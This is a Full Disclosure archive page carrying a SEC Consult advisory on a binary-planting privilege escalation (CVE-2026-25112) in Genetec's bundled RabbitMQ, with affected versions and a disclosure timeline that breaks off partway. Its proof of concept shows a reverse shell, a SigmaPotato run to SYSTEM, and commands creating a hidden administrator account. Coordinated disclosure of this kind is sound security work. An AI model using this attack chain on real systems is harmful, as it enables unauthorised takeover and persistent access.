---
title: SEC Consult SA-20260608-0 :: Privilege Escalation via Binary Planting in Genetec-provided RabbitMQ in multiple Genetec products
url: https://seclists.org/fulldisclosure/2026/Jun/2
source: Full Disclosure
date: 2026-06-09
fetch_date: 2026-06-10T06:17:14.601854
---

# SEC Consult SA-20260608-0 :: Privilege Escalation via Binary Planting in Genetec-provided RabbitMQ in multiple Genetec products

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20260608-0 :: Privilege Escalation via Binary Planting in Genetec-provided RabbitMQ in multiple Genetec products

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 8 Jun 2026 10:19:13 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20260608-0 >
=======================================================================
              title: Privilege Escalation via Binary Planting
            product: Genetec-provided RabbitMQ in multiple Genetec products
 vulnerable version: Multiple products, see below.
      fixed version: Multiple products, see below.
         CVE number: CVE-2026-25112
             impact: High
           homepage:https://www.genetec.com/products/unified-security/security-center
              found: 2026-03-02
                 by: Johannes Kruchem (Office Vienna)
                     Christian Hager (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Atos business
                     Europe | Asia

                     https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"Leading technology provider of business intelligence, unified physical
security, public safety, and operations. Genetec develops open-platform
software, hardware, and cloud-based services for the physical security
and public safety industry. Its flagship product, Security Center,
unifies IP-based video surveillance, access control, and automatic
license plate recognition (ALPR) into one platform. A global innovator
since 1997, Genetec is headquartered in Montreal, Canada, and serves
enterprise and government organizations via an integrated network of
resellers, integrators, and consultants in over 159 countries. Genetec
was founded on the principle of innovation and remains at the forefront
of emerging technologies that unify physical security systems."

Source:https://www.linkedin.com/company/genetec/

Business recommendation:
------------------------
The vendor provides a patch for multiple affected products which should
be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Local Privilege Escalation via Binary Planting (CVE-2026-25112)
The installation of RabbitMQ using Genetec Security Center installer
creates a directory `C:\ProgramData\Genetec\RabbitMQ` writable for any
authenticated user. The `erl.exe` now frequently tries to execute the
not existing `handle.exe` from this directory as
`NT AUTHORITY\LOCAL SERVICE`. Placing a malicious `handle.exe` in
`C:\ProgramData\Genetec\RabbitMQ` almost immediately invokes the `handle.exe`.
Since the LOCAL SERVICE user has `SeImpersonatePrivilege`, rotten potato attacks
lead to privilege escalation to SYSTEM.

Proof of concept:
-----------------
1) Local Privilege Escalation via Binary Planting (CVE-2026-25112)
Exploiting the LPE requires that RabbitMQ is installed via the Genetec Security
Center installer.

The "erl.exe" is looking for the executable "handle.exe" within the path
C:\ProgramData\Genetec\RabbitMQ, which does not exist. As the executable
erl.exe is running in the context of NT AUTHORITY\LOCAL SERVICE, the executable
handle.exe would also be executed in the same context. The path
C:\ProgramData\Genetec\RabbitMQ is writable for all users, which allows inserting
malicious executables as handle.exe. Planting an executable exploiting
Rotten Potato as handle.exe into C:\ProgramData\Genetec\RabbitMQ leads to privilege
escalation due to the enabled SeImpersonatePrivilege leading to SYSTEM.

[ genetec_handle_exe.png ]
Figure 1: Process explorer showing handle.exe calls

[ genetec_reverse_shell_whoami_priv.png ]
Figure 2: Established reverse shell, showing privileges including SeImpersonatePrivilege

The following listing shows the successful exploitation:
------------------------------------
PS C:\Users\...\Client> .\client.exe
[+] Listening on 0.0.0.0:9999 ...
[+] Waiting for incoming reverse shell connection ...

[+] Connection from 127.0.0.1:54674
[+] Shell session active ÔÇô type commands (exit to quit)
----------------------------------------------------

Microsoft Windows [Version 10.0.26200.7840]
(c) Microsoft Corporation. All rights reserved.

C:\ProgramData\Genetec\RabbitMQ> SigmaPotato.exe

C:\ProgramData\Genetec\RabbitMQ> whoami
nt authority\system

C:\ProgramData\Genetec\RabbitMQ> net user privesc [redacted] /ADD
The command completed successfully.

C:\ProgramData\Genetec\RabbitMQ> net localgroup Administrators privesc /ADD
The command completed successfully.

C:\ProgramData\Genetec\RabbitMQ> net localgroup Administrators
Alias name Administrators
Comment Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
privesc
The command completed successfully.
------------------------------------

Vulnerable / tested versions:
-----------------------------
The following product has been tested by SEC Consult:
* Genetec Mission Control

The following products were affected as well according to the vendor:

* Genetec-provided RabbitMQ (< v3.13.7.19)
* Genetec Mission Control™ (< v3.4.1.0)
* Genetec Industrial IoT (IIoT) — 5.x line (< v5.5.118.0)
* Genetec Industrial IoT (IIoT) — 6.x line (< v6.0.196.0)
* Genetec Airport Operational Manager (AOM) (< v1.6)
* Genetec Restricted Security Area (RSA) Surveillance (< v5.2.1)
* Genetec Inter-System (IS) Gateway (< v1.2)
* Sipelia™ (< v2.11)

All other Genetec products are not affected.

Vendor contact timeline:
------------------------
2026-03-03: Contacting vendor through Genetec PSIRT (security () genetec com)
2026-03-03: Confirmed receipt by Genetec
2026-03-10: Vendor confirmed vulnerability. Responded already with assigned
            CVE-2026-25112.
2026-03-12: Thanking vendor for professional and quick response. Asking for the
            patch development timeline.
2026-03-12: Vendor responds that their SLO is 60 days for high-severity issues.
            RabbitMQ prior to 4.2.3 is affected, used by multiple Genetec producs.
            Vendor will also provide a workaround if immediate update is not possible.
2026-03-13: Confirming alignment of coordinated advisory disclosure, asking for a list
            of affected products.
2026-03-13: Comprehensive list will be shared when all details are finalized.
2026-03-25: Vendor informs us that they are still actively working on it.
2026-04-07: Vendor informs us that they are still actively working on it.
2026-04-21: Vendor informs us that they are still actively working on it.
2026-04-23: Asking whether affected products are already known. Vendor will
            provide additional information when patched versions are confirmed.
2026-05-22: Vendor provides detailed list of affected products and version
            numbers as well as hot fix information & workaround. The CVE
       ...